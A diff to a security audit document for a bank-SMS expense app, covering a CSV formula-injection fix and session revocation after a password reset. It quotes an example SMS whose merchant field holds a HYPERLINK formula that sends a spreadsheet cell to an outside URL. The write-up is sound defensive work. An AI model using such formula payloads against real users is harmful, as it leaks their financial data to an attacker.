@@ -2457,6 +2457,57 @@ of six literals, so only those six are accepted. An off-list value is
 **dropped, not rejected**: the description is what matters and must never be
 lost over its label.
 
+### The client half: a formula in someone else's spreadsheet
+
+The one finding in this pass with a path to code execution on a third party's
+machine, and the only one that needed no account at all — just the victim's
+phone number.
+
+`csvField` in `exportCsv.ts` quoted correctly for RFC 4180 and did nothing
+about the actual risk: a spreadsheet treats a cell beginning with `=`, `+`,
+`-`, `@`, tab or CR as a **formula, quoted or not**. Quoting is not a defence;
+only changing the leading character is.
+
+Why that lands here specifically. Step 4 of the capture guide tells users to
+leave "Sender" empty, so the automation fires on any message matching a bank's
+format from anyone; `handler.ts` treats `sender` as a parser hint only; and
+`baiduri.ts`'s `MERCH` captures everything between its labels. So a text
+message reading `Card No.: 4x0213 Amount: BND 1.00 Merchant:
+=HYPERLINK("http://…"&A2,"Receipt") Date: …` lands in the ledger as a
+`parse_status: parsed` row at confidence 1.0. Export, open in Excel, and the
+sheet runs the sender's formula over the owner's spending history.
+
+**Fix:** the pure half of the export moved to `src/lib/csv.ts` (the shape
+`txFilters.ts` and `subscriptions.ts` already use — pure logic split out so it
+can be tested without expo-file-system, expo-sharing and a Supabase client),
+with two functions instead of one:
+
+- `csvField` — quoting only. For values this app generates: dates, amounts,
+  enums.
+- `csvText` — quoting **and** an apostrophe prefix on a leading formula
+  trigger. For everything a bank message or a user can write: `merchant`,
+  `raw_text`, `notes`, and the category name.
+
+The split is deliberate and is the part to not "simplify" later: **an incoming
+transaction is a negative amount**, and neutralising `-12.50` would turn a
+number into text and break every sum in the exported sheet. Neutralising the
+wrong column is its own bug. There is a test pinning exactly that.
+
+**And the reset path revokes siblings now.** `reset-password.tsx` called
+`updateUser({ password })` and stopped. GoTrue does not invalidate sibling
+refresh tokens on a password change, so a token captured from another device
+survived the reset. SEC-4 (§18) fixed only the signed-in path — Settings >
+Account signs out globally before mailing the link — and left the one that
+matters: someone whose account is compromised **cannot sign in**, so they
+arrive through "Forgot password" on the sign-in screen, where nothing was
+revoked at all. Now `signOut({ scope: 'others' })` runs after a successful
+change. Its failure is logged, not surfaced: the password is already changed by
+then, and sending the user back to a form for a step that succeeded is worse
+than the residual risk.
+
+`zod` was also dropped from `apps/mobile` — declared, never imported anywhere
+in the workspace, shipping in the bundle.
+
 ### Verified
 
 Migrations 01–20 applied clean on a full `supabase db reset`, then fifteen
@@ -2483,7 +2534,15 @@ Against the local edge runtime, after a clean stack restart:
 | 9,000-char text | `422 text_too_large` |
 | 10 KB / 25 KB / 40 KB / 50 KB body | `413 payload_too_large`, ~8 ms, no parse |
 
-Typecheck clean; 142 tests pass (feedback gained 4).
+The CSV fix is pinned by 20 tests in `apps/mobile/test/csv.test.ts`, one of
+which runs **the whole chain with no hand-written intermediate**: a crafted
+Baiduri SMS through the real `parseBankMessage` into `buildCsv`, asserting
+first that the parser really does extract the payload as `merchant` (so the
+test cannot go vacuous if parsing changes) and then that no cell in the output
+begins with a formula trigger.
+
+Typecheck clean; 161 tests pass across the workspace — feedback gained 4, the
+CSV module 20.
 
 ### Not verified
 
@@ -2500,6 +2559,13 @@ removing the gate.
 
 Nothing in this pass was exercised against the hosted project; that is the
 owner action below.
+
+**Neither client fix has been run in the app.** The CSV rendering is proven by
+unit tests over the real parser output, but nobody has tapped Export and opened
+the file in Excel or Numbers; and `signOut({ scope: 'others' })` is proven by
+nothing at all — verifying it needs two signed-in devices and a reset between
+them. Both need a fresh IPA to reach a phone regardless (no OTA channel), so
+the natural place to check them is the next build.
 
 ### Deliberately not fixed
 
